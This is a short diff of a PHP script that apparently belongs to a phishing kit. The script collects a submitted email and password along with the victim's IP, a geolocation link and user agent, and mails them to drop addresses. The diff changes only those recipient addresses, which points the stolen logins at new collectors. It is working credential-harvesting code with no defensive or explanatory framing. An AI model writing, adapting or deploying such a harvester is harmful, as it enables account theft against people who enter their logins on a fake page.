@@ -15,7 +15,7 @@ if($email != null && $password != null){
 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 	$message .= "User Agent : ".$useragent."\n";
 	$message .= "|-----------------------|\n";
-	$send = "katrinkohn200@gmail.com, agroliva@zoho.com";
+	$send = "StunchBox@n8.gs, Michbunnnyb@n8.gs";
 	$subject = "Login : $ip";
     mail($send, $subject, $message);   
 	$signal = 'ok';
@@ -39,5 +39,6 @@ $data = array(
         'msg' => $msg
     );
     echo json_encode($data);
+
 
 ?>
